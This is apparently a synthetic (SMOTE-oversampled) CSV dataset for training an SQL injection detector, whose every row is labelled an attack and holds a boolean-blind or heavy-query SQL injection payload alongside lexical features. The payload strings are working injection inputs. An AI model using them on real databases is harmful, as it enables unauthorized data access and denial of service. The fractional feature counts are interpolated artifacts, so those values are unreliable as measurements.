id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000150,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000123,0.26338005085166666,156.37871556656523,33.0,4.0983955078435255,74.0,18.0,44.0388990570559,20.33981650950932,0.47341998257942136,0.11515621197877818,0.28136179724896626,0.13006200819283417,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.339816509509317,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000151,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000120,0.12584808917024587,133.87308299927616,32.96827074981904,3.694198048110504,42.746165998552314,15.253834001447684,56.0,19.873082999276157,0.31925623850959445,0.11400215334126564,0.4183184473042787,0.14842316084486118,2.0,3.873082999276157,0.0,1.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,3.0,1.0,0.9682707498190397,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000152,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000051,0.08155118407636985,156.39420767508577,32.0,4.068959661161777,82.59613845005717,16.0,42.82691647859593,14.971152746432656,0.5280477004321309,0.10236477506550337,0.27383266003703977,0.095754864465326,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.971152746432655,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.9711527464326555,0.028847253567344466,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000153,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000105,1.0089726665518657,162.82405765979104,37.12962306391641,4.105415971558373,64.60646342577013,17.347217297937306,57.435188468041794,23.435188468041794,0.3963188505198855,0.10641086280678072,0.35311182055205503,0.1441584661212787,4.0,4.0,0.7824057659791025,-1.3877787807814457e-17,0.0,1.2175942340208974,0.0,8.0,0.435188468041795,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.2175942340208974,0.7824057659791024,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000154,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000060,1.8061084932749225,120.79290865325838,26.54023637822472,3.4104219018740993,37.67810897420223,13.0,55.195272435505586,14.919527243550558,0.312613327377642,0.10926340047122185,0.45374311703043946,0.12438015512069667,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,7.839054487101118,1.0804727564494416,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000155,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000129,0.9014492591982621,91.39556019290843,22.302219903545783,2.993564711505466,11.488900482271077,13.906659710637355,48.0,18.0,0.12546335288177893,0.15232734430807088,0.5252431293164729,0.19696617349367734,4.0,0.0,0.3022199035457849,-1.3877787807814457e-17,0.0,2.0,0.0,8.0,2.0,0.6977800964542151,1.0,2.302219903545785,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6977800964542151,0.3022199035457849,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000156,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000106,0.21643493537525035,114.13038527851761,32.24079886757828,3.852918413681846,37.444793205469665,21.0,42.444793205469665,13.240798867578278,0.32778830105932133,0.1844131000545721,0.3716961820246957,0.11610241686141091,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.2407988675782775,0.0,1.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000157,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,0.596099766896558,161.0,32.19674256602055,4.0514877928211375,74.0,18.0,48.0,21.0,0.45962732919254656,0.11180124223602485,0.2981366459627329,0.13043478260869565,0.8032574339794449,0.19674256602055507,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.0,0.0,5.0,4.0,5.0,0.8032574339794449,0.19674256602055495,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000158,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000068,1.0082126417994277,133.2026597502256,34.401994812669194,3.7793191477385406,43.80731431312037,16.594680499548822,54.398670124887204,18.40199481266919,0.3285222600142223,0.12489364470069796,0.40852343112644685,0.1380606641586329,2.0,3.202659750225589,0.0,1.0,0.0,1.1993350624436028,0.0,10.0,0.0,0.0,1.0,2.1993350624436028,1.0,0.8006649375563972,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1993350624436028,0.8006649375563972,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000159,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000103,1.0094374329050533,141.2942769652021,31.81450414849263,4.2366225494098355,81.85076451972421,8.703626037123158,35.22175622273894,15.518130185615785,0.5796069239063418,0.06177725688026035,0.24942180550420828,0.10919401370918955,3.1108781113694715,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.0,0.0,0.0,2.703626037123157,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.7036260371231571,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.703626037123157
SMOTE_000160,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000089,0.08560995398348095,80.3179327848039,27.829483196200975,3.9102137086658186,19.48844958860292,24.0,25.829483196200975,11.0,0.242213049379462,0.29906470711393646,0.32165091941271395,0.13707132409388756,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'novq'  =  'novq",nearest_attack_euclidean,R000063,1.055134002955291,141.72370793618524,31.72711773635588,3.4594406021979465,41.635588681779396,13.635588681779396,64.99829509991467,21.45423547271176,0.2942133883052641,0.09552494626273364,0.45851543433117714,0.15174623110082516,5.727117736355879,0.0,0.0,1.0,0.0,1.7271177363558792,0.0,11.72711773635588,0.2728822636441207,0.0,1.0,2.727117736355879,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2728822636441207,0.0,0.0,0.0,1.7271177363558792,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000162,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000149,0.7979610905600213,143.7095520956049,34.0,3.8247332450198535,40.30727412539051,22.44136678212864,54.96091118808576,26.0,0.2806695185221409,0.15528548398588393,0.38262749932476253,0.18141749816721262,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.8268185313476266,0.0,11.0,0.17318146865237347,2.0,1.0,9.826818531347627,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.8268185313476265,0.0,0.1731814686523735,0.8268185313476265,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8268185313476264
SMOTE_000163,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000142,0.23260082227221668,163.98220016188085,36.90747274198917,4.11383370774459,66.58362733895126,18.231318145027075,56.352309193924185,22.814945483978338,0.40603903793519563,0.11148497101146904,0.34338400541514225,0.1390919856381931,7.861209112983754,0.0,1.0462636290054153,-1.3877787807814457e-17,0.0,1.0462636290054155,0.0,7.8612091129837545,0.0,0.0,0.0,6.092527258010831,1.0,0.0,0.0462636290054152,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.04626362900541525,1.0,1.0,0.9537363709945847,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000164,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000145,0.6687295652596515,130.67440953039232,32.16860238259808,3.629572143498377,36.34881906078463,21.651180939215372,56.0,16.674409530392314,0.27794156970942996,0.16596682565436138,0.4286012093167641,0.12749039531944453,2.0,0.6744095303923152,0.0,1.0,0.0,2.0,0.0,10.0,0.0,0.0,1.0,3.0,1.0,0.16860238259807864,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000144,1.156850852085562,136.83063947146985,29.76612789429397,4.032323559393943,72.6612789429397,8.467744211412061,36.76612789429397,18.93548842282412,0.5306722531200523,0.06199758011349599,0.26871482995358964,0.1386153368128621,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,2.0,1.1693605285301487,2.4677442114120596,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.7661278942939702,0.2338721057060298,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000166,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000044,1.1826035467755769,70.11061860953939,24.0,3.5466386336435796,12.527654652384847,21.0,28.07374573969293,8.509218217461617,0.17815647472197715,0.3017428061676959,0.39845083896204814,0.12164988014827884,0.0,0.0,2.0,-1.3877787807814457e-17,0.5092182174616163,2.0,0.0,3.509218217461616,0.0,0.0,0.49078178253838356,4.509218217461616,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000167,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000052,0.46112900890751124,132.43897143399957,32.80487142924995,3.7108995370798636,37.0,15.0,54.829228575499684,25.609742858499892,0.27954027818893723,0.11332713980632589,0.4137961519078998,0.19333643009683704,0.0,0.8048714292499471,2.0,-1.3877787807814457e-17,0.0,1.0,0.0,11.804871429249946,0.0,2.0,1.0,9.0,0.0,0.804871429249947,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000168,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000151,0.2454321324430804,77.3651385284083,18.35270081755095,2.9742292795050544,13.000000000000004,12.28216065404076,39.15351803787772,12.92945983648981,0.16820014848210557,0.15935096036311408,0.5052710638829674,0.16717782727181296,4.0,0.0,1.0,-1.3877787807814457e-17,0.0705401635101901,2.0,0.0,5.85891967297962,0.0,0.0,0.0,3.07054016351019,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000169,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000012,0.1283800000615673,87.31012585200004,23.734663789230787,3.362931117901023,20.6285293049231,12.787731031384627,40.0,13.893865515692315,0.2358784751426109,0.1462558628311889,0.4587265099878785,0.15913915203832169,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.0,0.0,0.946932757846157,0.946932757846157,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000170,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000096,1.0244214408254195,143.7452565027283,32.75158116575724,4.173040853636866,69.50316233151446,16.49683766848553,40.75158116575724,16.99367533697106,0.4836087871546886,0.11471997713141958,0.2835482608531193,0.11812297486077253,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.0,0.0,1.2420941712138243,2.49683766848553,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000171,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000113,0.6902277834809766,130.05560991496776,31.252317079790323,3.6937005003638315,43.0,15.0,53.046341595806474,19.009268319161293,0.3325854824355049,0.11601819154726915,0.40535511562562937,0.1460412103915966,6.0,0.0,0.0,1.0,0.0,2.0,0.0,9.009268319161295,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000172,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000135,1.0365518622479446,138.57404583982043,32.0,3.8569142437727253,40.14351145995511,22.072900784898987,51.57175572997755,24.785877864988777,0.2897855325218527,0.158315158243906,0.37275536161335515,0.17914394762088617,0.0,0.7858778649887762,2.0,-1.3877787807814457e-17,0.0,1.7858778649887763,0.0,10.214122135011223,0.0,2.0,1.0,9.785877864988777,0.0,0.7858778649887761,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.7858778649887763,0.0,0.2141221350112238,0.7858778649887762,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7858778649887763
SMOTE_000173,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000108,0.7958414481578137,131.0,28.0,3.9877577678003235,84.0,3.0,31.0,13.0,0.6412213740458015,0.02290076335877861,0.2366412213740458,0.09923664122137404,2.376423035010742,0.623576964989258,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.0,0.0,0.0,2.0,1.0,0.7921410116702473,0.20785898832975266,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000174,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000094,0.012675746651728562,120.01307327537413,31.0,3.514160944633584,38.016341594217664,10.016341594217664,52.983658405782336,18.99673168115647,0.31676506766410634,0.08345633458013296,0.4414883148588072,0.15829028289695346,5.003268318843533,0.0,0.0,1.0,0.0,1.003268318843533,0.0,9.993463362312934,0.996731681156467,0.0,1.0,2.003268318843533,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9967316811564672,0.0,0.0,0.0,1.003268318843533,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000175,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000087,1.4184585520385724,132.01163002584124,27.33721000861375,3.923058731978292,69.31394995693125,6.68605004306875,36.0,20.01163002584125,0.5253105681054611,0.05046225393145723,0.27273449464906663,0.15149268331401503,0.0,3.3372100086137495,0.0,-1.3877787807814457e-17,1.0,1.3372100086137502,0.0,4.66278999138625,0.6744200172275003,5.0,4.0,2.3372100086137504,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.3372100086137502,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3372100086137504
SMOTE_000176,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000039,2.761457387778275,132.1821554254389,28.591077712719454,3.749442237792714,63.903357767538566,7.1375439890361765,45.18586510526689,15.95538856359727,0.4844193773638687,0.053806565820319244,0.34119850258861023,0.12057555422720176,4.182155425438908,0.0,0.0,0.5910777127194538,0.4089222872805462,0.0,0.0,8.137543989036176,0.0,0.0,1.4089222872805462,1.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.40892228728054625,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4089222872805465
SMOTE_000177,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000081,0.38029298279315193,120.01417917749791,29.0,3.885743224371235,47.3412106541655,14.13270314766676,41.87202324483254,16.6682421308331,0.3923571118162351,0.11987950580342305,0.34851460855555483,0.13924877382478706,3.06635157383338,0.0,0.06635157383337997,-1.3877787807814457e-17,0.0,1.0,0.0,8.6682421308331,0.0,1.0,2.8672968523332405,1.0663515738333795,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.06635157383337992,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9336484261666201,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000178,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000076,0.4381822242009552,82.43065699667824,22.28467150166088,3.2025222245548157,13.569343003321759,15.43065699667824,39.71532849833912,13.71532849833912,0.16496216689322693,0.18695348768910205,0.48179746614229335,0.1662868792753777,0.0,4.0,1.0,-1.3877787807814457e-17,0.85766424916956,1.85766424916956,0.0,6.0,0.0,0.0,0.0,3.71532849833912,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
